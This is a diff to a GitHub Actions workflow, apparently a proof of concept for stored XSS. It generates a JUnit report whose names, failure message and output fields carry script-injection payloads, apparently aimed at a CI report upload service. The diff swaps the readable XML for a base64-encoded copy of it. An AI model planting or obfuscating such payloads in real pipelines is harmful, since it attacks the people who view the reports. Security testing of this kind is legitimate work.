@@ -10,22 +10,7 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - name: Write malicious JUnit report
-        run: |
-          cat > malicious-report.xml << 'XMLEOF'
-<?xml version="1.0" encoding="UTF-8"?>
-<testsuites>
-  <testsuite name="&lt;img src=x onerror=alert(document.domain)&gt;SuiteXSS" tests="2" failures="1" errors="0" time="0.1">
-    <testcase classname="com.example.&lt;svg/onload=alert(1)&gt;ClassXSS" name="test_&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;_injection" time="0.05">
-      <failure message="XSS-TEST&lt;img src=x onerror=alert(&apos;mergify-stored-xss-failure-message&apos;)&gt;" type="AssertionError">
-Stack trace with payload: &lt;iframe srcdoc="&lt;script&gt;alert(&apos;mergify-stored-xss-stacktrace&apos;)&lt;/script&gt;"&gt;
-      </failure>
-      <system-out>SYSOUT-XSS&lt;img src=x onerror=alert(&apos;mergify-stored-xss-sysout&apos;)&gt;</system-out>
-    </testcase>
-    <testcase classname="com.example.NormalClass" name="test_normal_pass" time="0.02"/>
-  </testsuite>
-</testsuites>
-XMLEOF
-          echo "wrote report"
+        run: echo "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHRlc3RzdWl0ZXM+CiAgPHRlc3RzdWl0ZSBuYW1lPSImbHQ7aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoZG9jdW1lbnQuZG9tYWluKSZndDtTdWl0ZVhTUyIgdGVzdHM9IjIiIGZhaWx1cmVzPSIxIiBlcnJvcnM9IjAiIHRpbWU9IjAuMSI+CiAgICA8dGVzdGNhc2UgY2xhc3NuYW1lPSJjb20uZXhhbXBsZS4mbHQ7c3ZnL29ubG9hZD1hbGVydCgxKSZndDtDbGFzc1hTUyIgbmFtZT0idGVzdF8mbHQ7c2NyaXB0Jmd0O2FsZXJ0KFN0cmluZy5mcm9tQ2hhckNvZGUoODgsODMsODMpKSZsdDsvc2NyaXB0Jmd0O19pbmplY3Rpb24iIHRpbWU9IjAuMDUiPgogICAgICA8ZmFpbHVyZSBtZXNzYWdlPSJYU1MtVEVTVCZsdDtpbWcgc3JjPXggb25lcnJvcj1hbGVydCgnbWVyZ2lmeS1zdG9yZWQteHNzLWZhaWx1cmUtbWVzc2FnZScpJmd0OyIgdHlwZT0iQXNzZXJ0aW9uRXJyb3IiPgpTdGFjayB0cmFjZSB3aXRoIHBheWxvYWQ6ICZsdDtpZnJhbWUgc3JjZG9jPSImbHQ7c2NyaXB0Jmd0O2FsZXJ0KCdtZXJnaWZ5LXN0b3JlZC14c3Mtc3RhY2t0cmFjZScpJmx0Oy9zY3JpcHQmZ3Q7IiZndDsKICAgICAgPC9mYWlsdXJlPgogICAgICA8c3lzdGVtLW91dD5TWVNPVVQtWFNTJmx0O2ltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KCdtZXJnaWZ5LXN0b3JlZC14c3Mtc3lzb3V0JykmZ3Q7PC9zeXN0ZW0tb3V0PgogICAgPC90ZXN0Y2FzZT4KICAgIDx0ZXN0Y2FzZSBjbGFzc25hbWU9ImNvbS5leGFtcGxlLk5vcm1hbENsYXNzIiBuYW1lPSJ0ZXN0X25vcm1hbF9wYXNzIiB0aW1lPSIwLjAyIi8+CiAgPC90ZXN0c3VpdGU+CjwvdGVzdHN1aXRlcz4K" | base64 -d > malicious-report.xml
         id: tests
         continue-on-error: true
       - name: Mergify CI Upload
